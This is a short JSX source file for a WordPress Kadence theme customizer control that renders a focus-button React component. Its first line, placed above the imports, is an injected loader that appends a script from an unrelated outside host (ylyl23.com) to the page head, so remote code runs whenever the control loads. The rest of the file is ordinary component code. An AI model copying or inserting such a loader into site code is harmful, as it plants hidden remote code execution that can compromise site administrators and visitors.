(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import FocusButtonComponent from './focus-button-component';

export const FocusButtonControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <FocusButtonComponent control={ control } customizer={ wp.customize } /> );
		// ReactDOM.render( <FocusButtonComponent control={ control } customizer={ wp.customize } />, control.container[0] );
	}
} );
